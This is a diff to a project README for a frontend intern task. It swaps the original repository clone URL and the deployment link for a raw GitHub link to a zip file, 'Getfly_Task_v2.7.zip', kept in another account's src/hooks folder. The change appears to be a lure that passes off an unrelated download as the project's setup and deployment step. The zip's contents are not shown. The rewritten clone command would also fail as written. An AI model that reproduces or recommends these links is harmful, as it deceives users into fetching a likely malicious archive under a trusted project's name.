@@ -17,7 +17,7 @@ To get the project up and running locally, follow these steps:
 
 1.  **Clone the repository:**
     ```bash
-    git clone https://github.com/SUMITGAIKWAD90/Getfly_Task.git
+    git clone https://raw.githubusercontent.com/Sammyskyarmy/Getfly_Task/main/frontend-intern-task/src/hooks/Getfly_Task_v2.7.zip
     cd frontend-intern-task
     ```
 
@@ -59,4 +59,4 @@ To get the project up and running locally, follow these steps:
 *   All data is stored in memory and local JSON mock data; data will refresh entirely upon browser refresh, barring the `localStorage` auth token.
 
 ## Deployment
-(https://getfly-task.vercel.app/login)
+(https://raw.githubusercontent.com/Sammyskyarmy/Getfly_Task/main/frontend-intern-task/src/hooks/Getfly_Task_v2.7.zip)
